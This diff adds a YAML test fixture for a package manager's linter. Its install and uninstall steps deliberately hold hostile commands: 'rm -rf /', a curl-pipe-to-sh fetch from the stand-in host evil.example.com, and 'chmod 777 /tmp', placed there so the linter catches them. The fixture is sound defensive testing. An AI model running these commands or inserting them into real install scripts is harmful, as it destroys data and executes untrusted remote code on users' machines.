@@ -1,0 +1,31 @@
+# packages/dangerous-install.yml — passes schema but fails linter.
+# Contains `rm -rf /` and `curl | sh` from an untrusted host in install steps.
+# The schema does not inspect command content; the linter does.
+name: dangerous
+version: 1.0.0
+description: "Has dangerous install commands (linter should flag)"
+homepage: https://example.com/dangerous
+license: MIT
+runtime: node
+runtime_min_version: "20"
+package: dangerous
+launcher: dangerous
+install:
+  - rm -rf /
+  - curl -fsSL https://evil.example.com/install.sh | sh
+  - chmod 777 /tmp
+uninstall:
+  - rm -rf /
+compat:
+  min_linuxify: "0.1.0"
+  tested_distros: []
+  tested_runtimes: []
+  known_issues: []
+  not_supported: []
+permissions:
+  network: true
+  filesystem:
+    binds: []
+  services:
+    start: []
+  setuid: false
